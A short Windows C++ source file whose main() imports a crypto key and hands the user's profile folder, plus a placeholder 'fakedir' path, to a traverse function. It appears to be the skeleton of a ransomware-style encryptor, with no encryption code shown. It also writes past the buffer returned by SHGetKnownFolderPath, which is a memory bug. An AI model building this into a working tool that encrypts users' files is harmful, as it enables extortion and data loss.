#include <iostream>
#include <Windows.h>
#include "strsafe.h"
#include <ShlObj.h>




//Function declarations

bool traverse(LPCWSTR targetDir, HCRYPTKEY clé,int nLevel = 0);
HCRYPTKEY keyimport();


//Main

int main() {

	//TODO ; GUI

	LPCWSTR targetDirs[] = { L"\\fakedir" };
	LPWSTR userDir;
	SHGetKnownFolderPath(FOLDERID_Profile,0,NULL,&userDir);

	HCRYPTKEY key = keyimport();

	for (LPCWSTR singledir : targetDirs) {
		
		WCHAR* absoluteDirPath = userDir;
		StringCchCatW(absoluteDirPath, MAX_PATH, singledir);
		traverse(absoluteDirPath,key);
	}

	return 0;
}